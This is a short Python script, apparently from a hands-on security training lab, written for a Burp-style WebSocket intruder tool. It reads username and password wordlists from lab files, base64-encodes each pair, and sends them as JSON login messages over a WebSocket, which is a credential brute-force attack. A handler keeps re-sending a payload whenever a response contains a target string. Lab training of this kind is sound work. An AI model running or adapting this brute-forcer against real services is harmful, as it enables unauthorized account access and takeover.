import base64 

def queue_websockets(upgrade_request, payload):
    connection1 = websocket_connection.create(upgrade_request)
    usernames = open('C:\Users\pslearner\Desktop\LAB_FILES\usernames.txt', 'r')  
    passwords = open('C:\Users\pslearner\Desktop\LAB_FILES\passwords.txt', 'r')
    while True:
        username = base64.b64encode(usernames.readline().strip()).decode("ascii") 
        password = base64.b64encode(passwords.readline().strip()).decode("ascii")
        if not username or not password:
            break
        connection1.queue('{"auth_user":"'+username+'","auth_pass":"'+password+'"}')

def handle_outgoing_message(websocket_message):
    results_table.add(websocket_message)

def handle_incoming_message(websocket_message):
    # Warning: will continue sending messages until attack paused.
    if "Hal Pline" in websocket_message.getPayload():
        websocket_message.getConnection().queue(payload)
    results_table.add(websocket_message)
